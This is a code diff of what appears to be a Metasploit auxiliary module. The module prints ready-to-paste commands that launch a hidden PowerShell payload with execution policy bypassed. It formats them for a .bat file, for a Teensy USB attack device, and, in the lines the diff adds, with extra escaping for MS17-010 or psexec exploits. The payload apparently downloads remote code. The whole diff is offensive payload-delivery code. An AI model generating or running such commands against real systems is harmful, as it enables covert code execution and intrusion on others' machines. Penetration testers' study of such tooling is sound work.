@@ -100,17 +100,21 @@ class MetasploitModule < Msf::Auxiliary
     print("\n#{psh_expression}\n\n")
 
     print_good("Windows .bat file ready:")
-    bat_expression = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \""
+    bat_expression = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -c \""
     bat_expression << psh_expression
     bat_expression << "\""
     print("\n@echo off\n")
     print("#{bat_expression}\n\n")
 
     print_good("Teensy (Arduino) ready:") # this adds escapes for the quotes needed for putting this command into the Arduino IDE"
-    teensy_expression = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \\\""
+    teensy_expression = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -c \\\""
     teensy_expression << psh_expression
     teensy_expression << "\\\""
     print("\n#{teensy_expression}\n\n")
+
+    print_good("Fully Escaped - msf command ready: (Ideal of MS17-010 command or psexec command") # Adds additional escapes for msf commands"
+    escaped_expression = teensy_expression.gsub("'", %q(\\\'))
+    print("\n#{escaped_expression}\n\n")
   end
 
   # This function puts input from the Datastore into the full URL and file format needed to download
